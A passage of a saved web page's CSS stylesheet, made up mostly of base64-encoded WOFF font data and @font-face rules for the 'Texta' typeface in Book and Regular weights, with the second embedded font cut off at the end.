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) format('woff'), /* Modern Browsers */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Book/Texta-Book.ttf*/ url() format('truetype'), /* Safari, Android, iOS */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Book/Texta-Book.svg#Texta-Book*/ url() format('svg'); /* Legacy iOS */
    font-style: normal;
    font-weight: 400;
    text-rendering: optimizeLegibility;
}

/* END Book */


/* BEGIN Regular */
/*
@font-face {
    font-family: 'Texta';
    src: url("/risorseweb/poste_it/risorseweb/poste_it/risorse_dt/condivise/fonts/texta/Texta-Regular.otf");
    font-style: normal;
    font-weight: 500;
}
*/
@font-face {
    font-family: 'Texta';
    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Regular/Texta-Regular.eot*/ url(); /* IE9 Compat Modes */
    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Regular/Texta-Regular.eot?#iefix*/ url() format('embedded-opentype'), /* IE6-IE8 */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Regular/Texta-Regular.woff*/ url(data:application/font-woff;base64,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